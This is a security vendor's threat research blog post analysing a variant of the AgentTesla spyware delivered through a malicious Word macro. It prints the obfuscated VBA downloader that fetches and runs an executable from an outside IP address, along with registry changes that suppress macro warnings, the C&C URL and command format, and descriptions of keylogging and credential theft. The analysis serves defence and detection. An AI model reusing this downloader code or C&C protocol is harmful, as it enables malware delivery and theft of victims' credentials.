
<!DOCTYPE HTML>
<html lang="en" data-template="post-page">
<head>
    <meta charset="UTF-8"/>
    <title>In-Depth Analysis of A New Variant of .NET Malware AgentTesla</title>
    <meta name="keywords" content="office,microsoft,MSFT,vba,malware,vulnerability,Threat Research,visual basic,macros"/>
    <meta name="description" content="FortiGuard Labs recently captured some malware which was developed with the Microsoft .Net framework. I analyzed one of them, and in this blog, I’m going to show you how it is able to steal information from a victim’s machine.

The malware was spread via a Microsoft Word document that contained an auto-executable malicious VBA Macro. Figure 1 below shows how it looks when it’s opened.



Figure 1. When the malicious Word document is opened

What the VBA code does

Once you click the “Enable Content”..."/>
    <meta name="template" content="post-page"/>
    

    <meta name="viewport" content="width=device-width, initial-scale=1"/>


<meta name="google-site-verification" content="tiQ03tSujT2TSsWJ6tNHiiUn8cwYVmdMQrGUCNrPQmo"/>

<meta property="og:site_name" content="Fortinet Blog"/>
<meta property="og:title" content="In-Depth Analysis of A New Variant of .NET Malware AgentTesla"/>
<meta property="og:url" content="https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr.html"/>
<meta property="og:type" content="article"/>
<meta property="og:description" content="FortiGuard Labs recently captured some malware which was developed with the Microsoft .Net framework. I analyzed one of them, and in this blog, I’m going to show you how it is able to steal informa…"/>
<meta property="og:image" content="https://www.fortinet.com/content/dam/fortinet-blog/article-images/individual-images/deep-analysis-of-cve2016.jpg"/>

<meta property="twitter:card" content="summary"/>
<meta property="twitter:site" content="@Fortinet"/>

<meta property="article:author" content="Xiaopeng Zhang"/>

    <meta property="article:section" content="Threat Research"/>


    <meta property="article:published_time" content="2017-06-28T00:00:00.000-07:00"/>


    <meta property="article:tag" content="office"/>

    <meta property="article:tag" content="microsoft"/>

    <meta property="article:tag" content="MSFT"/>

    <meta property="article:tag" content="vba"/>

    <meta property="article:tag" content="malware"/>

    <meta property="article:tag" content="vulnerability"/>

    <meta property="article:tag" content="visual basic"/>

    <meta property="article:tag" content="macros"/>


<link rel="shortcut icon" href="/etc/designs/fortinet-blog/favicon.ico"/>


    
<link rel="stylesheet" href="/etc.clientlibs/fortinet-blog/clientlibs/clientlib-base.min.css" type="text/css">






<!-- SEO Script -->




<!-- OneTrust Cookies Consent Notice start for fortinet.com -->



    <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="f85f39fc-d7aa-467a-b762-fbb722748016"></script>
    <script type="text/javascript">

function OptanonWrapper() {
    {
       try{
            $('#cookiescript_injected').remove(); // remove old cookie script
        }catch(e){}
        window.dataLayer.push({
            event: 'OneTrustGroupsUpdated'
        });
        Optanon.InsertScript('//assets.adobedtm.com/launch-EN23cb8375449840dc93b13f34d935b8b9.min.js','head',null, null, '1',true);
    }
}

</script>


<!-- OneTrust Cookies Consent Notice end for fortinet.com -->
    
    
    

    
    

    
    
    
    

    

    

    

    

    

</head>
<body>





<div class="root responsivegrid">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="b1-header aem-GridColumn aem-GridColumn--default--12">


<header class="b1-header__container">
    <div class="b1-header__logo">
        <a href="https://www.fortinet.com">
            
            <img class="desktop-logo" src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="In-Depth Analysis of A New Variant of .NET Malware AgentTesla"/>
            <img class="mobile-logo" src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="In-Depth Analysis of A New Variant of .NET Malware AgentTesla"/>
        </a>
    </div>

    <div class="b1-header__cta-list">
      <a class="b1-header__cta-list-item " href="https://www.fortinet.com/blog">
          <span>Blog</span>
      </a>
    </div>

    <div class="b1-header__nav"><div class="b2-navigation">




    <ul class="b2-navigation__list">
        
            <li class="b2-navigation-categories"><div class="b2-navigation__list-item nav-dropdown-title">Categories</div>
                <ul class="navdropdown">
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/business-and-technology">
                                <span>Business &amp; Technology </span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/threat-research">
                                <span>Threat Research</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/industry-trends">
                                <span>Industry Trends</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/partners">
                                <span>Partners</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/customer-stories">
                                <span>Customer Stories</span>
                            </a>
                        </li>
                    
                
                    
                        <li>
                            <a class="b2-navigation__dropdown__list-item" href="/blog/psirt-blogs">
                                <span>PSIRT Blogs</span>
                            </a>
                        </li>
                    
                </ul>
            </li>

        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/business-and-technology">
                    <span>Business &amp; Technology </span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/threat-research">
                    <span>Threat Research</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/industry-trends">
                    <span>Industry Trends</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/partners">
                    <span>Partners</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/customer-stories">
                    <span>Customer Stories</span>
                </a>
            </li>
        
            <li class="m-nav-item">
                <a class="b2-navigation__list-item false" href="/blog/psirt-blogs">
                    <span>PSIRT Blogs</span>
                </a>
            </li>
        
        
        
            <li>
                <a class="b2-navigation__list-item false" href="/blog/ciso-collective">
                    <span>CISO Collective</span>
                </a>
            </li>
        
    </ul>


    

</div>
</div>

    <div class="b1-header__search"><div class="b3-searchbox">


<form class="b3-searchbox__form" action="/blog/search" method="get">
    <input class="b3-searchbox__input" type="text" name="q" placeholder="Search Blogs"/>
    <button class="b3-searchbox__icon" aria-label="Search" type="submit">
        
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.688 14.18l-4.075-4.075C12.36 9.06 12.8 7.78 12.8 6.4 12.8 2.87 9.93 0 6.4 0 2.87 0 0 2.87 0 6.4c0 3.53 2.87 6.4 6.4 6.4 1.38 0 2.66-.44 3.705-1.187l4.075 4.075c.207.208.48.312.753.312.274 0 .547-.104.755-.312.416-.417.416-1.093 0-1.51zM2.133 6.4c0-2.357 1.91-4.267 4.267-4.267s4.267 1.91 4.267 4.267-1.91 4.267-4.267 4.267S2.133 8.757 2.133 6.4z" fill="#fff">
        </path>
    </svg>

    </button>
</form>


    

</div>
</div>

    <div class="b1-header__search-toggle">
        
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.688 14.18l-4.075-4.075C12.36 9.06 12.8 7.78 12.8 6.4 12.8 2.87 9.93 0 6.4 0 2.87 0 0 2.87 0 6.4c0 3.53 2.87 6.4 6.4 6.4 1.38 0 2.66-.44 3.705-1.187l4.075 4.075c.207.208.48.312.753.312.274 0 .547-.104.755-.312.416-.417.416-1.093 0-1.51zM2.133 6.4c0-2.357 1.91-4.267 4.267-4.267s4.267 1.91 4.267 4.267-1.91 4.267-4.267 4.267S2.133 8.757 2.133 6.4z">
        </path>
    </svg>

        <div class="b1-header__search-toggle-close">
            <span class="b1-header__search-toggle-close-line"></span>
            <span class="b1-header__search-toggle-close-line"></span>
        </div>
    </div>

    <div class="b1-header__nav-toggle" aria-hidden="true">
        <span class="b1-header__nav-toggle-line"></span>
        <span class="b1-header__nav-toggle-line"></span>
        <span class="b1-header__nav-toggle-line"></span>
    </div>
</header>

    

</div>
<section class="b4-hero aem-GridColumn aem-GridColumn--default--12">



<div class="b4-hero__container" style="background-image:url(/content/dam/fortinet-blog/article-images/individual-images/deep-analysis-of-cve2016.jpg);">
    <img class="ratio" alt="In-Depth Analysis of A New Variant of .NET Malware AgentTesla" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
    <div class="b4-hero__text text-container">
        <p data-ly-test class="b4-hero__kicker">Threat Research</p>
        
        
        <h1 class="b4-hero__headline">In-Depth Analysis of A New Variant of .NET Malware AgentTesla</h1>
        
    </div>
</div>
</section>
<section class="b15-blog-meta aem-GridColumn aem-GridColumn--default--12">

<div class="b15-blog-meta__container text-container">
    <span>By </span>

    <span class="b15-blog-meta__author">

        
					

                        

                                  
                                      
                                            
                                              <a href="/blog/search?author=Xiaopeng+Zhang">Xiaopeng Zhang</a>
                                          
                                          
                                           
                                      
                                  
                          
                    
        
    </span>
    <span class="b15-blog-meta__">
        

              </span>



    <span class="b15-blog-meta__date"> | June 28, 2017</span>
</div>
</section>
<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="raw-import aem-GridColumn aem-GridColumn--default--12">
<div class="text-container"><style>
@media (max-width: 767px)
{
#sblogs img
{
max-width: 100%;
}
#sblogs, li, p, pre code, pre
	{
		white-space: initial;
		word-break: break-word;
	}

}
@media (min-width: 768px)
{
#sblogs img
{
max-width: 100%;
}
}
</style>


<div id="sblogs">

<h2>Background</h2>

<p>FortiGuard Labs recently captured some malware which was developed using the Microsoft .Net framework. I analyzed one of them, it&#39;s a new variant from AgentTasla family. In this blog, I&rsquo;m going to show you how it is able to steal information from a victim&rsquo;s machine.</p>

<p>The malware was spread via a Microsoft Word document that contained an auto-executable malicious VBA Macro. Figure 1 below shows how it looks when it&rsquo;s opened.</p>

<p align="center"><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-1994.png" data-style="width: 1020px; height: 727px;"/></p>

<p align="center">Figure 1. When the malicious Word document is opened</p>

<h3>What the VBA code does</h3>

<p>Once you click the &ldquo;Enable Content&rdquo; button, the malicious VBA Macro is executed covertly in the background. The code first writes some key values into the device&rsquo;s system registry to avoid the Macro security warning when opening Word documents with risky content the next time. &nbsp;</p>

<p>Here are the key values it writes into system registry:</p>

<blockquote>
<p><em>HKCU\Software\Microsoft\Office\{word version}\Word\Security\,AccessVBOM, dword, 1</em></p>

<p><em>HKCU\Software\Microsoft\Office\{word version}\Word\Security\,VBAWarning, dword, 1</em></p>
</blockquote>

<p align="center"><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-1995.png" data-style="width: 932px; height: 387px;"/></p>

<p align="center">Figure 2. Writing two key values into the system registry</p>

<p>Once that task is completed, it re-opens this Word document in a new Word program instance and exits. The Macro is executed again, but this time it follows a different code branch. The main purpose of the Macro executed in the new Word program instance is to dynamically extract a new VBA function (<em>ljRIpdKkSmQPMbnLdh</em>) and get it called.</p>

<p>Let&rsquo;s take a look at this function:</p>

<blockquote>
<pre>
<strong><em>Sub ljRIpdKkSmQPMbnLdh</em></strong><em>()</em>

<em>    Dim dmvAQJch As String</em>

<em>    Dim JWyaIoTHtZaFG As String</em>

<em>    Dim TrbaApjsFydVkOGwjnzkpOB As String</em>

<em>    dmvAQJch = <span data-style="background-color:#FFFF00;">CreateObject</span>(ThisDocument.bQYHDG(&quot;66627281787F833D6277747B7B&quot;, </em>

<em>15)).ExpandEnvironmentStrings(ThisDocument.bQYHDG(&quot;3463747C7F34&quot;, 15))</em>

<em>    JWyaIoTHtZaFG = ThisDocument.bQYHDG(&quot;6B&quot;, 15)</em>

<em>    TrbaApjsFydVkOGwjnzkpOB = ThisDocument.bQYHDG(&quot;797085823D748774&quot;, 15)</em>

<em>    dmvAQJch = dmvAQJch + JWyaIoTHtZaFG + TrbaApjsFydVkOGwjnzkpOB</em>

<em>    Dim cllbWRRTqqWoZebEpYdGmnPBLAx As String</em>

<em>    cllbWRRTqqWoZebEpYdGmnPBLAx = ThisDocument.bQYHDG(&quot;7783837F493E3E43443D46463D42443D4142483E403E837E7370883D748774&quot;, </em>

<em>15)</em>

<em>    Dim OhYBGFWMcPWNnpvvuTeitVAK As Object</em>

<em>    Set OhYBGFWMcPWNnpvvuTeitVAK = </em>

<em><span data-style="background-color:#FFFF00;">CreateObject</span>(ThisDocument.bQYHDG(&quot;5C7872817E827E75833D675C5B5763635F&quot;, 15))</em>

<em>    OhYBGFWMcPWNnpvvuTeitVAK.Open ThisDocument.bQYHDG(&quot;565463&quot;, 15), cllbWRRTqqWoZebEpYdGmnPBLAx, False</em>

<em>    OhYBGFWMcPWNnpvvuTeitVAK.<span data-style="background-color:#FFFF00;">send</span></em>


<em>    If OhYBGFWMcPWNnpvvuTeitVAK.Status = 200 Then</em>

<em>        Dim BIPvJqwtceisuIuipCzbpsWRuhRwp As Object</em>

<em>        Set BIPvJqwtceisuIuipCzbpsWRuhRwp = </em>

<em>CreateObject(ThisDocument.bQYHDG(&quot;50535E53513D62838174707C&quot;, 15))</em>

<em>        BIPvJqwtceisuIuipCzbpsWRuhRwp.Open</em>

<em>        BIPvJqwtceisuIuipCzbpsWRuhRwp.Type = 1</em>

<em>        BIPvJqwtceisuIuipCzbpsWRuhRwp.Write OhYBGFWMcPWNnpvvuTeitVAK.<span data-style="background-color:#FFFF00;">responseBody</span></em>

<em>        BIPvJqwtceisuIuipCzbpsWRuhRwp.<span data-style="background-color:#FFFF00;">SaveToFile</span> dmvAQJch, 2</em>

<em>        BIPvJqwtceisuIuipCzbpsWRuhRwp.Close</em>

<em>    End If</em>

<em>    If Len(Dir(dmvAQJch)) &lt;&gt; 0 Then</em>

<em>        Dim TGoCeWgrszAukk</em>

<em>        TGoCeWgrszAukk = <span data-style="background-color:#FFFF00;">Shell</span>(dmvAQJch, 0)</em>

<em>    End If</em>

<strong><em>End Sub</em></strong></pre>
</blockquote>

<p>All key words in this function are encoded. Here they are after decoding:</p>

<blockquote>
<pre>
<em>bQYHDG(&quot;66627281787F833D6277747B7B&quot;, 15) =&gt; </em>&ldquo;<span data-style="background-color:#FFFF00;">WScript.Shell</span>&rdquo;

<em>bQYHDG(&quot;3463747C7F34&quot;, 15) =&gt; </em><span data-style="background-color:#FFFF00;">&ldquo;%Temp%&rdquo;</span>

bQYHDG(&quot;797085823D748774&quot;, 15) =&gt; &ldquo;javs.exe&rdquo;

bQYHDG(&quot;7783837F493E3E43443D46463D42443D4142483E403E837E7370883D748774&quot;, 15) =&gt; <span data-style="background-color:#FFFF00;">&ldquo;hxxp://45.77.35.239/1/today.exe&rdquo;</span>

<em>bQYHDG(&quot;5C7872817E827E75833D675C5B5763635F&quot;, 15) =&gt; </em><span data-style="background-color:#FFFF00;">&ldquo;Microsoft.XMLHTTP&rdquo;</span>

<em>bQYHDG(&quot;565463&quot;, 15) =&gt; </em><span data-style="background-color:#FFFF00;">&ldquo;Get&rdquo;</span></pre>
</blockquote>

<p>As you may have realized from the highlighted keywords, this malware is designed to download an executable file and run it by calling the &ldquo;Shell&rdquo; function. Indeed, it downloads the file &ldquo;today.exe&rdquo; to &ldquo;%Temp%\javs.exe&rdquo;, and runs it.</p>

<h3>The downloaded exe file</h3>

<p align="center"><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-1996.png" data-style="width: 779px; height: 441px;"/></p>

<p align="center">Figure 3. Detailed information of the downloaded javs.exe file</p>

<p>From the analysis result of the PE analysis tool in Figure 3, we know that the downloaded &ldquo;javs.exe&rdquo; was built&nbsp;with&nbsp;.Net Framework. Looking at its icon, it is easy to assume that this is a pdf related file. But it&rsquo;s not. This is simply a deception used to confuse the victim.</p>

<p>Once executed, it starts another process by calling the function CreateProcessA with the CREATE_SUSPENDED flag. This procedure could allow the memory of the second process to be modified by calling the function WriteProcessMemory. Finally, the process is restored to run by calling the functions SetThreadContext and ResumeThread.</p>

<p>Figure 4, below, shows how CreateProcessA is called.</p>

<p align="center"><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-1997.png" data-style="width: 1029px; height: 675px;"/></p>

<p align="center">Figure 4. javs.exe calls CreateProcessA</p>

<p>Through my analysis, I was able to determine that the data being injected into the second process by calling WriteProcessMemory is another executable file. This file was decoded from a BMP resource in the first javs.exe process. Interestingly, the injected executable was also built with .Net framework.</p>

<p>As you may know, the .Net program only contains complied bytecode. This code can only be parsed and executed in its .Net CLR virtual machine. As a result, debugging a .Net program using the usual Ollydbg or Windbg tools is a challenge. So I had to determine which other analysis tools would work.</p>

<h2>Analysis of the second .Net program</h2>

<p>From the above analysis, I was able to determine that the second .Net program had been dynamically decoded from the javs.exe process memory. So the next challenge was capturing its entire data and saving it as an exe file for analysis. To do that, I used the memory tool to dump it directly from the second process memory. Figure 5 shows what the dumped file looks like in the analysis tool.</p>

<p align="center"><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-1998.png" data-style="width: 733px; height: 556px;"/></p>

<p align="center">Figure 5. Dumped memory file in analysis tool</p>

<p>The &ldquo;File is corrupted&rdquo; warning obviously occurs because the dumped file&rsquo;s PE header was wrong. I manually repaired the PE header using a sort of unpacking technique.&nbsp; After that, the dumped file could be recognized, statically analyzed, and debugged. In Figure 6 below, you can see the repaired file was recognized as a .Net assembly, and you even can see .NET Directory information in CFF Explorer.</p>

<p align="center"><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-1999.png" data-style="width: 896px; height: 502px;"/></p>

<p align="center">Figure 6. Repaired dump file in analysis tool</p>

<p>The author of the malware used some anti-analysis techniques to prevent it from being analyzed.&nbsp; For example, obfuscation is used to make the function names and variable names difficult to understand, and encoding is used to hide key words and data so analysts have a hard time understanding what it is trying to do. The repaired .Net program even causes the static analysis tool .NET Reflector to not work because the names of classes, functions, and variables are unreadable. From Figure 7 below, you can see what the code looks like using these techniques.</p>

<p><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2000.png" data-style="width: 1280px; height: 714px;"/></p>

<p align="center">Figure 7. The Main function with anti-analysis techniques</p>

<p>To better analyze the malware, I tried to rename parts of the unreadable names. So please note that in the following analysis the unreadable names in the referred code have been renamed to readable names.</p>

<p>Ok, at this point we are finally ready to do the analysis.&nbsp; Let&rsquo;s get started to see what is going to happen.</p>

<h2>Analysis of the .Net malware</h2>

<p>Once executed, it goes through the current running processes to kill any duplicate processes found. It then sends &ldquo;uninstall&rdquo; and &ldquo;update&rdquo; commands to the C&amp;C server. If the response to the &ldquo;uninstall&rdquo; command from the server contains an &ldquo;uninstall&rdquo; string, it cleans up the information it has written on the victim&rsquo;s machine and exits. When I ran the malware, no &ldquo;uninstall&rdquo; string was contained in the response, so I could proceed with the analysis. The following two Figures show you how the &ldquo;update&rdquo; command is sent to the C&amp;C server.</p>

<p align="center"><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2001.png" data-style="width: 865px; height: 500px;"/></p>

<p align="center">Figure 8. Sending &ldquo;update&rdquo; command to C&amp;C server</p>

<p><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2002.png" data-style="width: 1098px; height: 592px;"/></p>

<p align="center">Figure 9. Function used to send data to the C&amp;C server</p>

<p>From Figure 9, we learn that the URL of the C&amp;C server is &ldquo;hxxp://www.vacanzaimmobiliare.it/testla/WebPanel/post.php&rdquo;, which was decrypted in the &ldquo;SendToCCServer&rdquo; function. The HTTP method is &ldquo;POST&rdquo;, which was also decrypted.</p>

<p>Next, it copies itself from &ldquo;%temp%\javs.exe&rdquo; to &ldquo;%appdata%\Java\JavaUpdtr.exe&rdquo;. In this way it disguises itself by looking like an update program for Java. It then writes the full path into the value &quot;Software\Microsoft\Windows NT\CurrentVersion\Windows\load&quot; in the system registry so that &ldquo;JavaUpdtr.exe&rdquo; can be executed automatically when the system starts.</p>

<p>The code snippet below shows us how the full path to &ldquo;JavaUpdtr.exe&rdquo; is defined.</p>

<blockquote>
<pre>
<em><span data-style="color:#0000FF;">private static string</span> appdata_Java_JavaUpdtr.exe = Environment.GetEnvironmentVariable(&quot;<span data-style="color:#FF0000;">appdata</span>&quot;) + &quot;<span data-style="color:#FF0000;">\\Java\\JavaUpdtr.exe</span>&quot;;</em></pre>
</blockquote>

<p>This malware can record the victim&rsquo;s keyboard inputs, steal data from the system clipboard when its content changes, capture screenshots of the victim&rsquo;s system screen, and collect credentials from installed software that the malware is interested in. To complete these tasks, it creates a variety of threads and timers.</p>

<p>In the following sections I&rsquo;ll discuss them in detail.</p>

<h2>Stealing keyboard inputs, system clipboard contents, and screen shots</h2>

<p>Before the Main function is called, three hook objects are defined in the construction function of the main class. These are used for hooking the Keyboard, Mouse, and Clipboard.&nbsp; It then sets hook functions for all of them so that when victim inputs something by keyboard, or when the clipboard data is changed (Ctrl+C), the hook functions will be called first. Figure 10 shows part of the hook function of the key down event.</p>

<p><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2003.png" data-style="width: 964px; height: 682px;"/></p>

<p align="center">Figure 10. Key &ldquo;down&rdquo; event hook function</p>

<p>In this function, it first grabs the Window title where the victim types in and puts it into an html code. Next, it captures which key the victim presses, and converts the key code string into an html code. For example, &ldquo;<img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2004.png" data-style="width: 369px; height: 21px;"/>&quot;. As you can see, the html code is concatenated to the variable &ldquo;<em>pri_string_saveAllStolenKey_Clipboard_Data</em>&rdquo;. Note: I modified the name to be readable.</p>

<p>In the hook function for the system clipboard, it goes through a similar process. It captures the clipboard content every time the clipboard content is changed (e.g press Ctrl+C , Ctrl+X, etc.) by calling the function Clipboard.GetText(). It then puts the collected data into an html code, and again concatenates it to the variable &ldquo;<em>pri_string_saveAllStolenKey_Clipboard_Data</em>&rdquo;. Figure 11 is the code snippet of this function.</p>

<p><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2005.png" data-style="width: 995px; height: 315px;"/></p>

<p align="center">Figure 11. Clipboard change event hook function</p>

<p>It also creates a timer whose function is called every 10 minutes.&nbsp; In the timer function, it captures screenshots of the victim&rsquo;s screen and then uses the API &ldquo;<em>Graphics::CopyFromScreen</em>&rdquo; to grab the screenshots and saves them into the file &ldquo;%appdata%\ScreenShot\screen.jpeg&rdquo;. It later encodes the file screen.jpeg with base64 and then sends it to its C&amp;C server using the command &ldquo;screenshots&rdquo;.</p>

<p>It keeps taking screenshots every 10 minutes and sends them to the C&amp;C server so the malware author can see what the victim is doing. Figure 12 shows the malware sending out a screen.jpeg file by calling the sending function.</p>

<p><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2006.png" data-style="width: 973px; height: 537px;"/></p>

<p align="center">Figure 12. Sending out a screenshot file</p>

<h2>Stealing the credentials of installed software</h2>

<p>At the end of the Main function, it creates another thread whose function is to collect credentials from a variety of software on the victim&rsquo;s machine. It can collect user credentials from the system registry, local profile files, SQLite database files, and so on. Once it has captured the credentials of one the software packages it is looking for, it immediately sends it to the C&amp;C server. One HTTP packet contains the credentials of one software package.</p>

<p>Based on my analysis, this malware is able to obtain the credentials from the following software.</p>

<h3>Browser clients:</h3>

<p>Google Chrome, Mozilla &nbsp;Firefox, Opera, Yandex, Microsoft IE, Apple Safari, SeaMonkey, ComodoDragon, FlockBrowser, CoolNovo, SRWareIron, UC browser, Torch Browser.</p>

<h3>Email clients:</h3>

<p>Microsoft Office Outlook, Mozilla Thunderbird, Foxmail, Opera Mail, PocoMail, Eudora, TheBat!.</p>

<h3>FTP clients:</h3>

<p>FileZilla, WS_FTP, WinSCP, CoreFTP, FlashFXP, SmartFTP, FTPCommander.</p>

<h3>Dynamic DNS:</h3>

<p>DynDNS, No-IP.</p>

<h3>Video chatting<strong>:</strong></h3>

<p>Paltalk, Pidgin.</p>

<h3>Download management:</h3>

<p>Internet Download Manager, JDownloader.</p>

<p>In my test environment, I installed Microsoft Office Outlook with a Gmail account. Figure 13 shows what Outlook data is sent to the C&amp;C server.</p>

<p><img alt="" src="/content/dam/fortinet-blog/new-images/uploads/in-depth-analysis-of-net-malware-javaupdtr-2007.png" data-style="width: 923px; height: 364px;"/></p>

<p align="center">Figure 13. Sending the captured credentials of Microsoft Office Outlook</p>

<h2>C&amp;C command format</h2>

<p>Below is the C&amp;C command format string.</p>

<p>&quot;type={0}&amp;hwid={1}&amp;time={2}&amp;pcname={3}&amp;logdata={4}&amp;screen={5}&amp;ipadd={6}&amp;wbscreen={7}&amp;client={8}&amp;link={9}&amp;username={10}&amp;password={11}&amp;screen_name={12}&quot;</p>

<p>Next, I will explain the meaning of each field.</p>

<p>&nbsp;&quot;type&quot; holds the command name; &quot;hwid&quot; is the hardware id; &quot;time&quot; is the current date and time; &quot;pcname&quot; consists of the user name and computer name; &quot;logdata&quot; consists of key log and clipboard data; &quot;screen&quot; is base64 encoded screen.jpeg file content; &quot;ipadd&quot; is not used; &quot;wbscreen&quot; consists of picture content from the camera; &quot;client&quot; is the name of the software; &quot;link&quot; is the software&rsquo;s website; &quot;username&quot; is the logon user name; &quot;password&quot; is the logon password; &quot;screen_name&quot; is not used .</p>

<p>In the table below, all the C&amp;C commands (type field) that the malware supports are listed.</p>

<table border="1" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td data-style="width:86px;">
			<p>Command</p>
			</td>
			<td data-style="width:496px;">
			<p>Comment</p>
			</td>
		</tr>
		<tr>
			<td data-style="width:86px;">
			<p>uninstall</p>
			</td>
			<td data-style="width:496px;">
			<p>Ask the server if exit itself</p>
			</td>
		</tr>
		<tr>
			<td data-style="width:86px;">
			<p>update</p>
			</td>
			<td data-style="width:496px;">
			<p>Send the server updates of victim&rsquo;s device</p>
			</td>
		</tr>
		<tr>
			<td data-style="width:86px;">
			<p>info</p>
			</td>
			<td data-style="width:496px;">
			<p>Send the server victim&rsquo;s system information</p>
			</td>
		</tr>
		<tr>
			<td data-style="width:86px;">
			<p>webcam</p>
			</td>
			<td data-style="width:496px;">
			<p>Send image files from victim&rsquo;s camera if have</p>
			</td>
		</tr>
		<tr>
			<td data-style="width:86px;">
			<p>screenshots</p>
			</td>
			<td data-style="width:496px;">
			<p>Send screenshot of victim&rsquo;s screen</p>
			</td>
		</tr>
		<tr>
			<td data-style="width:86px;">
			<p>keylog</p>
			</td>
			<td data-style="width:496px;">
			<p>Send the server recorded key inputs and clipboard data</p>
			</td>
		</tr>
		<tr>
			<td data-style="width:86px;">
			<p>passwords</p>
			</td>
			<td data-style="width:496px;">
			<p>Send collected credentials from some software</p>
			</td>
		</tr>
	</tbody>
</table>

<h2><br />
Other features</h2>

<p>Through my analysis I was able to determine that this is a spyware designed to collects a victim&rsquo;s system information, and continually record the victim&rsquo;s keyboard inputs, changes to the system clipboard, as well as capture the credentials of a number of popular software tools.&nbsp; Finally, it sends all the collected data to its C&amp;C server.</p>

<p>However, by carefully going through the decompiled *.cs files, I was able to discover some additional features built into this malware that are not currently used. They include:</p>

<ul>
	<li>Using the SMTP protocol to communicate with the server instead of HTTP.</li>
	<li>Obtaining system hardware information, including processor, memory, and video card.</li>
	<li>Enabling the collection of images from victim&rsquo;s camera.</li>
	<li>Restarting the system after adding &ldquo;JavaUptr.exe&rdquo; to the startup group in the system registry.</li>
	<li>Killing any running analysis processes, AV software, or Keylogger software, etc.</li>
</ul>

<p>There is the possibility that these features will be used in future versions.</p>

<h2>Solution</h2>

<p>The Word sample is detected as &ldquo;WM/Agent.DJO!tr.dldr&rdquo;, and Javs.exe has been detected as &ldquo;MSIL/Generic.AP.EA826!tr&rdquo; by FortiGuard AntiVirus service.</p>

<p>The URL of the C&amp;C server has been detected as &ldquo;Malicious Websites&rdquo; by FortiGuard WebFilter service.</p>

<h2>IoC:</h2>

<h2>URL:</h2>

<p>45.77.35.239/1/today.exe</p>

<p>www.vacanzaimmobiliare.it/testla/WebPanel/post.php</p>

<h2>Sample SHA256:</h2>

<p>Yachtworld Invoice Outstanding.doc</p>

<p><em>1A713E4DDD8B1A6117C10AFE0C45496DFB61154BFF79A6DEE0A9FFB0518F33D3</em></p>

<p>Javs.exe</p>

<p><i>5D4E22BE32DCE5474B61E0DF305861F2C07B10DDADBC2DC937481C7D2B736C81</i></p>


</div></div>
</div>

    
</div>
</div>
<div class="b16-blog-tags aem-GridColumn aem-GridColumn--default--12">



  <div class="b16-blog-tags__container text-container">
    <span class="b16-blog-tags__headline">Tags:</span>
    <p class="b16-blog-tags__tag-links">
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=office">office</a>, 
    
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=microsoft">microsoft</a>, 
    
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=msft">MSFT</a>, 
    
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=vba">vba</a>, 
    
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=malware">malware</a>, 
    
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=vulnerability">vulnerability</a>, 
    
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=visual-basic">visual basic</a>, 
    
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=macros">macros</a>
    </p>
  </div>

</div>
<section class="b12-related aem-GridColumn aem-GridColumn--default--12">




<div class="b12-related__container text-container">
    

    
    
    <h3>Related Posts</h3>
    <div class="b12-related__posts">
        
